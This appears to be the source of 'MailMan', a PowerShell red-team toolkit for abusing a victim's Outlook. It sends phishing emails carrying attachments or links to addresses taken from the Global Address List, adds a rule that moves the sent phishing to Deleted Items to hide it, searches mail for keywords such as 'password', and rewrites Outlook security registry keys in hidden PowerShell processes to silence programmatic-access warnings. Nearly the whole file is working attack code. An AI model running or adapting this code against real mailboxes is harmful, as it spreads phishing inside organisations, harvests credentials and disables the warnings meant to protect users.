#requires -version 2

<#


MailMan v0.1

by @xorrior

#>

Function Invoke-Spam {
    <#
    .SYNOPSIS
    This function sends emails using a custom or default template to specified target email addresses.

    .DESCRIPTION
    This function sends a specified number of phishing emails to a random list of email addresses or a specified target list. A payload or URL can be included in the email. The E-Mail will be constructed based on a 
    template or by specifying the Subject and Body of the email. 

    .PARAMETER Targets
    Array of target email addresses. If Targets or TargetList parameter are not specified, a list of 100 email addresses will be randomly selected from the Global Address List. 

    .PARAMETER TargetList
    List of email addresses read from a file. If Targets or TargetList parameter are not specified, a list of 100 email addresses will be randomly selected from the Global Address List.

    .PARAMETER URL
    URL to include in the email

    .PARAMETER PayloadFile
    Full path to the file to use as a payload 

    .PARAMETER Template
    Full path to the template html file

    .PARAMETER Subject
    Subject of the email

    .PARAMETER Body
    Body of the email

    .EXAMPLE

    Invoke-Spam -Targets $Emails -URL "http://bigorg.com/projections.xls" -Subject "Hi" -Body "Please check this <a href='URL'>link</a> out!"

    Send phishing email to the array of target email addresses with an embedded url. 

    .EXAMPLE

    Invoke-Spam -TargetList .\Targets.txt -Attachment .\Notice.rtf -Template .\Phish.html

    Send phishing email to the list of addresses from file and include the specified attachment. 

    #>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $False, Position = 0, ValueFromPipeline = $True)]
        [string[]]$Targets,

        [Parameter(Mandatory = $False, Position = 1)]
        [string]$TargetList,

        [Parameter(Mandatory = $False, Position = 2)]
        [string]$URL,

        [Parameter(Mandatory = $False, Position = 3)]
        [string]$Attachment,

        [Parameter(Mandatory = $False, Position = 4)]
        [String]$Template,

        [Parameter(Mandatory = $False, Position = 5)]
        [string]$Subject,

        [Parameter(Mandatory = $False, Position = 6)]
        [String]$Body

    )



    #check for a target list file or the targets parameter 
    if($TargetList){
        if(!(Test-Path $TargetList)){
            Throw "Not a valid file path for E-Mail TargetList"
        }
        $TargetEmails = Get-Content $TargetList
    }
    elseif($Targets){
        $TargetEmails = $Targets
    }
    
    #check if a template is being used 
    if($Template){
        if(!(Test-Path $Template)){
            Throw "Not a valid file path for E-mail template"
        }
        $EmailBody = Get-Content -Path $Template
        $EmailSubject = $Subject
    }
    elseif($Subject -and $Body){
        $EmailSubject = $Subject 
        $EmailBody = $Body 
    }
    else {
        Throw "No email Subject and/or Body specified"
    }

    #Check for a url to embed
    if($URL){
        $EmailBody = $EmailBody.Replace("URL",$URL)
    }

    #Read the Outlook signature locally if available 
    $appdatapath = $env:appdata
    $sigpath = $appdatapath + "\Microsoft\Signatures\*.htm"

    if(Test-Path $sigpath){
        $Signature = Get-Content -Path $sigpath
    }


     
    #Iterate through the list, craft the emails, and then send it off. 
    ForEach($Target in $TargetEmails){

        $Email = $script:Outlook.CreateItem(0)
        #If there was an attachment, include it with the email 
        if($Attachment){
            $($Email.Attachment).Add($Attachment)
        }
        $Email.HTMLBody = "$EmailBody"
        $Email.Subject = $EmailSubject
        $Email.To = $Target

        #if there is a signature, add it to the email
        if($Signature){
            $Email.HTMLBody += "`n`n" + "$Signature"
        }
        $Email.Send()

    } 
   
}

#This function is a work-in-progress
Function Invoke-SentItemsRule {

    <#
    .SYNOPSIS
    This function enables an Outlook rule where all mail items in the sent items folder, that match the specified subject string, will be sent to the deleted items folder

    .PARAMETER Subject
    The subject string to use in the rule

    #>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $True, Position = 0)]
        [string]$Subject,

        [Parameter(Mandatory = $True, Position = 1)]
        [string]$RuleName,

        [Parameter(Mandatory = $False)]
        [switch]$Disable
    )


    if($Disable){
        $rule = (($script:Outlook.session).DefaultStore).GetRules() | Where-Object {$_.Name -eq $RuleName}
        $rule.enabled = $False 
    }
    else{

        #$SentItemsFolder = Get-OutlookFolder -Name "SentMail"
        $olRuleType = "Microsoft.Office.Interop.Outlook.OlRuleType" -as [type]
        $MoveTarget = Get-OutlookFolder -Name "DeletedItems"
        $rules = (($script:Outlook.session).DefaultStore).GetRules()
        $rule = $rules.Create("$RuleName",$olRuleType::olRuleSend)
        $SubjectCondition = $rule.Conditions.Subject 
        $SubjectCondition.enabled = $True 
        $SubjectCondition.Text = @("$Subject")
        $action = $rule.Actions.MoveToFolder
        $action.Folder = $MoveTarget
        $action.enabled = $True
        $rule.enabled = $True 
        $rules.Save()
    }
    

}

Function Get-OSVersion {

    <#
    .SYNOPSIS
    Determines the Operating System version of the host

    .Example
    Check-OSVersion

    #>

    #Function to grab the major and minor verions to determine the OS. 
    Write-Verbose "Detecting OS..."
    $OS = [environment]::OSVersion.Version


    if($OS.Major -eq 10){
        $OSVersion = "Windows 10"
    }

    #if the major version is 6, the OS can be from Vista to Windows 8.1
    if($OS.Major -eq 6){
        switch ($OS.Minor){
            3 {$OSVersion = "Windows 8.1/Server 2012 R2"}
            2 {$OSVersion = "Windows 8/Server 2012"}
            1 {$OSVersion = "Windows 7/Server 2008 R2"}
            0 {$OSVersion = "Windows Vista/Server 2008"}
        }
    }
    if($OS.Major -eq 5){
        switch ($OS.Minor){
            2 {$OSVersion = "Windows XP/Server 2003 R2"}
            1 {$OSVersion = "Windows XP"}
            0 {$OSVersion = "Windows 2000"}

        }
    }

    Write-Verbose "Checking the bitness of the OS"
    if((Get-WmiObject -class win32_operatingsystem).OSArchitecture -eq "64-bit"){
        $OSArch = 64
    }
    else{
        $OSArch = 32
    }
    $OSVersion
    $OSArch 
}



Function Get-OutlookFolder{
    <#
    .SYNOPSIS
    This functions returns one of the Outlook top-level, default folders

    .PARAMETER Name
    Name of the desired folder. Default name is Inbox. 

    .EXAMPLE 
    Get-OutlookFolder -Name "Inbox"

    #>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $True, Position = 0)]
        [String]$Name
    )

    $OlDefaultFolders = @{
        "olFolderCalendar" = 9
        "olFolderConflicts" = 19
        "olFolderContacts" = 10
        "olFolderDeletedItems" = 3
        "olFolderDrafts" = 16
        "olFolderInbox" = 6
        "olFolderJournal" = 11
        "olFolderJunk" = 23
        "olFolderLocalFailures" = 21
        "olFolderManageEmail" = 29
        "olFolderNotes" = 12
        "olFolderOutbox" = 4
        "olFolderSentMail" = 5
        "olFolderServerFailures" = 22
        "olFolderSuggestedContacts" = 30
        "olFolderSyncIssues" = 20
        "olFolderTasks" = 13
        "olFolderToDo" = 28
        "olPublicFoldersAllPublicFolders" = 18
        "olFolderRssFeeds" = 25
    }



    $DefaultFolderName = "olFolder$Name"

    $Value = $OlDefaultFolders.Item($DefaultFolderName)

    $FolderObj =  $script:MAPI.GetDefaultFolder($Value)

    Write-Verbose "Obtained Folder Object"

    $FolderObj

}

Function Get-EmailItems{
    <#
    .SYNOPSIS
    This function returns all of the items for the specified folder

    .PARAMETER Folder
    System.__ComObject for the Top Level folder

    .PARAMETER MaxEmails
    Maximum number of emails to grab

    .PARAMETER Full
    Return the Full mail item object

    .EXAMPLE
    Get-EmailItems -Folder "Inbox"

    #>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $True, Position = 0)]
        [System.__ComObject]$Folder,

        [Parameter(Mandatory = $False, Position = 1)]
        [int]$MaxEmails,

        [Parameter(Mandatory = $False)]
        [switch]$FullObject
    )
    
    $FOlderObj = $Folder

    if($MaxEmails){
        $Items = $FolderObj.Items | Select-Object -First $MaxEmails
    }
    else{
        $Items = $FolderObj.Items
    }

    if(!($FullObject)){
        $Emails = @()
        Write-Verbose "Creating custom Email item objects..."
        $Items | ForEach {

            $Email = New-Object PSObject -Property @{
                To = $_.To
                FromName = $_.SenderName 
                FromAddress = $_.SenderEmailAddress
                Subject = $_.Subject
                Body = $_.Body
                TimeSent = $_.SentOn
                TimeReceived = $_.ReceivedTime

            }

            $Emails += $Email

        }
    }
    else{
        Write-Verbose "Obtained full Email Item objects...."
        $Emails = $Items
    }
    

    $Emails 


}

Function Invoke-MailSearch{

    <#
    .SYNOPSIS
    This function searches the given Outlook folder for items (Emails, Contacts, Tasks, Notes, etc. *Depending on the folder*) and returns
    any matches found.

    .DESCRIPTION
    This function searches the given Outlook folder for items containing the specified keywords and returns any matches found. 

    .PARAMETER Folder
    Folder to search in. Default is the Inbox. 

    .PARAMETER Keyword
    Keyword/s to search for. The default is password

    .PARAMETER MaxResults
    Maximum number of results to return.

    .PARAMETER MaxSearch
    Maximum number of emails to search through

    .PARAMETER MaxThreads
    Maximum number of threads to use when searching 
    
    .EXAMPLE
    Invoke-MailSearch -Keywords "admin", "password" -MaxResults 20

    Conduct a search on the Inbox with admin and password specified as keywords. Return a maximum of 20 results. 

    #>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $True, Position = 0)]
        [string]$DefaultFolder,

        [Parameter(Mandatory = $True, Position = 1)]
        [string[]]$Keywords,

        [Parameter(Mandatory = $False, Position = 2)]
        [int]$MaxResults,

        [Parameter(Mandatory = $False, Position = 3)]
        [int]$MaxThreads,

        [Parameter(Mandatory = $False, Position = 4)]
        [int]$MaxSearch
    )

    #Variable to hold the results 
    $Results = @()

    $SearchEmailBlock = {

        param($Keywords, $MailItem)

        $Subject = $MailItem.Subject 
        $Body = $MailItem.Body 

        ForEach($word in $Keywords){
            if(($Subject -match "($word)") -or ($Body -match "($word)")){
                $Email = $MailItem
                break
            }
        
        }
        $Email 
    }


    $OF = Get-OutlookFolder -Name $DefaultFolder

    if($MaxSearch){
        $Emails = Get-EmailItems -Folder $OF -FullObject -MaxEmails $MaxSearch
    }
    else {
        $Emails = Get-EmailItems -Folder $OF -FullObject   
    }

        

    Write-Verbose "[*] Searching through $($Emails.count) emails....."


    #All of this multithreading magic is taken directly from harmj0y and his child, powerview
    #https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1#L5672
    $sessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
    $sessionState.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()

    #Get all the current variables for this runspace 
    $MyVars = Get-Variable -Scope 1

    $VorbiddenVars = @("?","args","ConsoleFileName","Error","ExecutionContext","false","HOME","Host","input","InputObject","MaximumAliasCount","MaximumDriveCount","MaximumErrorCount","MaximumFunctionCount","MaximumHistoryCount","MaximumVariableCount","MyInvocation","null","PID","PSBoundParameters","PSCommandPath","PSCulture","PSDefaultParameterValues","PSHOME","PSScriptRoot","PSUICulture","PSVersionTable","PWD","ShellId","SynchronizedHash","true")

    #Add the variables from the current runspace to the new runspace 
    ForEach($Var in $MyVars){
        if($VorbiddenVars -notcontains $Var.Name){
            $sessionState.Variables.Add((New-Object -Typename System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
        }
    }

    
    Write-Verbose "Creating RunSpace Pool"
    $pool = [runspacefactory]::CreateRunspacePool(1, $MaxThreads, $sessionState, $host)
    $pool.Open()

    $jobs = @()
    $ps = @()
    $wait = @()

    $counter = 0
    $MsgCount = 1

    ForEach($Msg in $Emails){

        Write-Verbose "Searching Email # $MsgCount/$($Emails.count)"

        while ($($pool.GetAvailableRunSpaces()) -le 0){

            Start-Sleep -Milliseconds 100

        }

        $ps += [powershell]::create()

        $ps[$counter].runspacepool = $pool

        [void]$ps[$counter].AddScript($SearchEmailBlock).AddParameter('Keywords', $Keywords).AddParameter('MailItem', $Msg)

        $jobs += $ps[$counter].BeginInvoke();

        $wait += $jobs[$counter].AsyncWaitHandle

        $counter = $counter + 1
        $MsgCount = $MsgCount + 1

    }

    $waitTimeout = Get-Date 

    while ($($jobs | ? {$_.IsCompleted -eq $false}).count -gt 0 -or $($($(Get-Date) - $waitTimeout).totalSeconds) -gt 60) {
        Start-Sleep -Milliseconds 100
    }

    for ($x = 0; $x -lt $counter; $x++){

        try {
            
            $Results += $ps[$x].EndInvoke($jobs[$x])

        }
        catch {
            Write-Warning "error: $_"
        }

        finally {

            $ps[$x].Dispose()
        }
    }

    $pool.Dispose()

    if($MaxResults){

       $Results = $Results | Select-Object -First $MaxResults
       $Results | ForEach-Object {
            $_  | Select-Object SenderEmailAddress, Subject, Body, SentOn | Format-List  
            Write-Host "`n"
       }
 
    }
    else{
        $Results | ForEach-Object {
            $_  | Select-Object SenderEmailAddress, Subject, Body, SentOn | Format-List 
            Write-Host "`n"
        }
    }
    
}

Function Get-SubFolders{
    <#
    .SYNOPSIS
    This function returns a list of all the folders in the specified top level folder.

    .PARAMETER FolderName
    Name of the top-level folder to retrieve a list of folders from.

    .PARAMETER FullObject
    Return the full folder object instead of just the name

    .EXAMPLE
    Get-SubFolders -FolderName "SentMail"
    
    Get a list of folders and sub-folders from the sentmail box. 
    #>


    [CmdletBinding()]
    param(
        [parameter(Mandatory = $False, Position = 0)]
        [System.__ComObject]$Folder
    )

    $SubFolders = $Folder.Folders

    If(!($SubFolders)){
        Write-Verbose "No subfolders were found for folder: $($Folder.Name)"
    }

    if(!($Fullobject)){
        $SubFolders = $SubFolders | ForEach {$_.Name}
    }
    
    $SubFolders 
    


}

Function Get-GlobalAddressList{
    <#
    .SYNOPSIS
    This function returns an array of Contact objects from a Global Address List object.

    #>

    if($script:MAPI){
        $GAL = $script:MAPI.GetGlobalAddressList()
    }
    else {
        Throw "Unable to obtain the Global Address List"
    }

    $GAL = $GAL.AddressEntries
    $GAL 
}

Function Get-SMTPAddress{
    <#
    .SYNOPSIS
    Gets the PrimarySMTPAddress of a user.

    .DESCRIPTION
    This function returns the PrimarySMTPAddress of a user via the ExchangeUser object. 

    .PARAMETER FullName
    First and Last name of the user

    .OUTPUTS
    System.String . Primary email address of the user.

    #>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $False, Position = 0, ValueFromPipeline = $True)]
        [string[]]$FullNames
    )

    #Grab the GAL 
    $GAL = Get-GlobalAddressList
    #If the full name is given, try to obtain the exchange user object

    $PrimarySMTPAddresses = @() 
    If($FullNames){
        ForEach($Name in $FullNames){
            try{
                $User = $GAL | Where-Object {$_.Name -eq $Name}
            }
            catch {
                Write-Warning "Unable to obtain exchange user object with the name: $Name"
            }
            $PrimarySMTPAddresses += $($User.GetExchangeuser()).PrimarySMTPAddress
        }
    }
    else{
        try {
            $PrimarySMTPAddresses = (((($script:MAPI.CurrentUser).Session).CurrentUser).AddressEntry.GetExchangeuser()).PrimarySmtpAddress
        }
        catch{
            Throw "Unable to obtain primary smtp address for the current user"
        }
    }

    $PrimarySMTPAddresses

}

Function Disable-SecuritySettings{

    <#
    .SYNOPSIS
    This function checks for the existence of the Outlook security registry keys ObjectModelGuard, PromptOOMSend, and AdminSecurityMode. If 
    the keys exist, overwrite with the appropriate values to disable to security prompt for programmatic access.

    .DESCRIPTION
    This function checks for the ObjectModelGuard, PromptOOMSend, and AdminSecurityMode registry keys for Outlook security. Most likely, this function must be 
    run in an administrative context in order to set the values for the registry keys. 

    .PARAMETER Version
    The version of microsoft outlook. This is pertinent to the location of the registry keys. 

    .EXAMPLE
    Disable-SecuritySettings -Version 15

    #>
    
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $False)]
        [string]$User,

        [Parameter(Mandatory = $False)]
        [string]$Password,

        [parameter(Mandatory = $True)]
        [string]$Version
    )

    $count = 0
    $Version = $Version.Substring(0,4)

    #Check AV to see if it's up to date. 
    $AV = Get-WmiObject -namespace root\SecurityCenter2 -class Antivirusproduct
    if($AV){
        $AVstate = $AV.productState
        $statuscode = '{0:X6}' -f $AVstate
        $wscupdated = $statuscode[4,5] -join '' -as [byte]
        if($wscupdated -eq  (00 -as [byte]))
        {
            Write-Verbose "AV is up to date"
            $AVUpdated = $True
        }
        elseif($wscupdated -eq (10 -as [byte])){
            Write-Verbose "AV is not up to date"
            $AVUpdated = $False
        }
        else{
            Write-Verbose "Unable to determine AV status"
            $AVUpdated = $False 
        }
    }
    else{
        Write-Verbose "AV not installed"
        $AVUpdated = $False
    }
    

    $LMSecurityKey = "HKLM:\SOFTWARE\Microsoft\Office\$Version\outlook\Security"
        
    $CUSecurityKey = "HKCU:\SOFTWARE\Policies\Microsoft\Office\$Version\outlook\security"

    $ObjectModelGuard = "ObjectModelGuard"
    $PromptOOMSend = "PromptOOMSend"
    $AdminSecurityMode = "AdminSecurityMode" 

    $cmd = " "

    if(!(Test-Path $LMSecurityKey)){
        #if the key does not exists, create or update the appropriate reg keys values.
        $cmd = "New-Item $LMSecurityKey -Force; "
        $cmd += "New-ItemProperty $LMSecurityKey -Name ObjectModelGuard -Value 2 -PropertyType DWORD -Force; "
       

    }
    else{

        $currentValue = (Get-ItemProperty $LMSecurityKey -Name ObjectModelGuard -ErrorAction SilentlyContinue).ObjectModelGuard 
        if($currentValue -and ($currentValue -ne 2)){
            #Save the original value 
            $script:ObjectModelGuardEdited = $True
            $script:OldObjectModelGuard = (Get-ItemProperty $LMSecurityKey -Name ObjectModelGuard).ObjectModelGuard
            $cmd = "Set-ItemProperty $LMSecurityKey -Name ObjectModelGuard -Value 2 -Force; "
        }
        elseif(!($currentValue)) {
            $cmd = "New-ItemProperty $LMSecurityKey -Name ObjectModelGuard -Value 2 -PropertyType DWORD -Force; "
        }
    
                
    }
    if(!(Test-Path $CUSecurityKey)){

        $cmd += "New-Item $CUSecurityKey -Force; "
        $cmd += "New-ItemProperty $CUSecurityKey -Name PromptOOMSend -Value 2 -PropertyType DWORD -Force; " 
        $cmd += "New-ItemProperty $CUSecurityKey -Name AdminSecurityMode -Value 3 -PropertyType DWORD -Force; "
      
    }
    else{
        $currentValue = (Get-ItemProperty $CUSecurityKey -Name PromptOOMSend -ErrorAction SilentlyContinue).PromptOOMSend
        if($currentValue -and ($currentValue -ne 2)){
            #save the old value  
            $script:OldPromptOOMSend = (Get-ItemProperty $CUSecurityKey -Name PromptOOMSend).PromptOOMSend
            $cmd += "Set-ItemProperty $CUSecurityKey -Name PromptOOMSend -Value 2 -Force; "
            $script:PromptOOMSendEdited = $True
        }
        elseif(!($currentValue)) {
             $cmd += "New-ItemProperty $CUSecurityKey -Name PromptOOMSend -Value 2 -PropertyType DWORD -Force; "
        }
        
        $currentValue = (Get-ItemProperty $CUSecurityKey -Name AdminSecurityMode -ErrorAction SilentlyContinue).AdminSecurityMode 
        if($currentValue -and ($currentValue -ne 3)){
            #save the old value 
            $script:OldAdminSecurityMode = (Get-ItemProperty $CUSecurityKey -Name AdminSecurityMode).AdminSecurityMode
            $cmd += "Set-ItemProperty $CUSecurityKey -Name AdminSecurityMode -Value 3 -Force"
            $script:AdminSecurityModeEdited = $True 
        }
        elseif(!($currentValue)) {
            $cmd += "New-ItemProperty $CUSecurityKey -Name AdminSecurityMode -Value 3 -PropertyType DWORD -Force"
        }
                  
    }

    if($User -and $Password){

        #If creds are given start a new powershell process and run the commands. Unable to use the Credential parameter with 
        $pw = ConvertTo-SecureString $Password -asplaintext -Force
        $creds = New-Object -Typename System.Management.Automation.PSCredential -argumentlist $User,$pw
        $WD = 'C:\Windows\SysWOW64\WindowsPowerShell\v1.0\'
        $Arg = " -WindowStyle hidden -Command $cmd"
        Start-Process "powershell.exe" -WorkingDirectory $WD -Credential $creds -ArgumentList $Arg
        $count += 1
        

    }
    else{

        #Start-Process powershell.exe -WindowStyle hidden -ArgumentList $cmd
        if($cmd){
            try {
                Invoke-Expression $cmd
            }
            catch {
                Throw "Unable to change registry settings to disable security prompt"
            }
        }
        $count += 1
        
    }
    

    if($count -eq 1){
        $True
    }
    elseif($count -eq 0){
        $False
    }

}

Function Reset-SecuritySettings{
    <#

    .SYNOPSIS
    This function resets all of the registry keys to their original state

    .PARAMETER AdminUser
    Administrative user

    .PARAMETER AdminPass
    Password of administrative user

    .EXAMPLE
    Reset-SecuritySettings

    #>

    [CmdletBinding()]
    param()


    $Version = $script:Outlook.Version 
    $Version = $Version.Substring(0,4)

    $LMSecurityKey = "HKLM:\SOFTWARE\Microsoft\Office\$Version\Outlook\Security"

    $CUSecurityKey = "HKCU:\SOFTWARE\Policies\Microsoft\Office\$Version\outlook\security"

        
        
    #if the old value exists, that means the registry key was set and not created. 
    if($($script:ObjectModelGuardEdited)){
        #If the key was set, change it back to original value
        $cmd = "Set-ItemProperty $LMSecurityKey -Name ObjectModelGuard -Value $($script:OldObjectModelGuard) -Force;"
    }
    else{
        #if the key was created, remove it.
        $cmd = "Remove-ItemProperty -Path $LMSecurityKey -Name ObjectModelGuard -Force;"
    }

    if($script:PromptOOMSendEdited){
        $cmd += "Set-ItemProperty $CUSecurityKey -Name PromptOOMSend -Value $($script:OldPromptOOMSend) -Force;" 
    }
    else {
        $cmd += "Remove-ItemProperty -Path $CUSecurityKey -Name PromptOOMSend -Force;"
    }

    if($script:AdminSecurityModeEdited){
        $cmd += "Set-ItemProperty $CUSecurityKey -Name AdminSecurityMode -Value $($script:OldAdminSecurityMode) -Force"
    }
    else {
        $cmd += "Remove-ItemProperty -Path $CUSecurityKey -Name AdminSecurityMode -Force"
    }

    if($script:DisableUser -and $script:DisablePass){

        $pw = ConvertTo-SecureString $script:DisablePass -asplaintext -Force
        $creds = New-Object -Typename System.Management.Automation.PSCredential -argumentlist $script:DisableUser,$pw
        $WD = 'C:\Windows\SysWOW64\WindowsPowerShell\v1.0\'
        $Arg = " -WindowStyle hidden -Command $cmd"
        Start-Process powershell.exe -WorkingDirectory $WD -Credential $creds -ArgumentList $Arg 
    }
    else {
        try {
            Invoke-Expression $cmd
        }
        catch {
            Throw "Unable to reset registry keys"
        }
    }

}


Function Get-OutlookInstance{
    <#
    .SYNOPSIS
    Get an instance of Outlook. This function must be executed in the same user context of the Outlook application. Specify a Username and password of an admin level account if the 
    current user does not have administrative privileges. This level of access is needed to change/create the Outlook security registry keys. 

    .PARAMETER AdminUser
    Username of account with administrative privileges 

    .PARAMETER AdminPass
    Password of account with administrative privileges

    .EXAMPLE
    Get-OutlookInstance -User "TEST\cross" -Password "BAhbAhBlackSheep"

    Get an instance of Outlook and use the specified credentials to change the registry keys. 

    #>

    [CmdletBinding()]
    param(

        [parameter(Mandatory = $False, Position = 0)]
        [string]$AdminUser,

        [parameter(Mandatory = $False, Position = 1)]
        [string]$AdminPass
    )

    #Switch user context from Administrator to the 
    Write-Verbose "Checking to see if Outlook is currently running"
    [System.Reflection.Assembly]::LoadWithPartialName("System.Runtime.InteropServices") | Out-Null
    if(Get-Process | Where-Object {$_.ProcessName -eq "OUTLOOK"}){
        #If outlook is currently running, grab an instance. This script must be running in the same user context as Outlook in order for this to work.  
        try{
            $script:Outlook = [System.Runtime.InteropServices.Marshal]::GetActiveObject("Outlook.Application")
        }
        catch {
            Throw "Unable to obtain Outlook instance"
        }
    }
    else{
        #Start an Outlook instance
        try {
            $script:Outlook = New-Object -ComObject "Outlook.Application"   
        }
        catch {
            Throw "Unable to create Outlook com object"
        }
    }

    $OV = $script:Outlook.Version
    
    if($AdminUser -and $AdminPass){
        $result = Disable-SecuritySettings -User $AdminUser -Password $AdminPass -Version $OV
        Write-Verbose "Security Prompt should be disabled"
        $script:DisableUser = $AdminUser
        $script:DisablePass = $AdminPass
    }
    else{
        $result = Disable-SecuritySettings -Version $OV 
    }

    if($result){
        Write-Verbose "Programmatic access prompt has been disabled"
        $Script:MAPI = $script:Outlook.GetNamespace('MAPI')
    }
    else{
        Write-Warning "Programmitic access prompt has not been disabled"
    }

    #$Script:MAPI = $script:Outlook.GetNamespace('MAPI')
    #Namespace.Logon method is unnecessary if we are using the default profile 
    #$script:MAPI.Logon("", "", $NULL, $NULL)
    

}

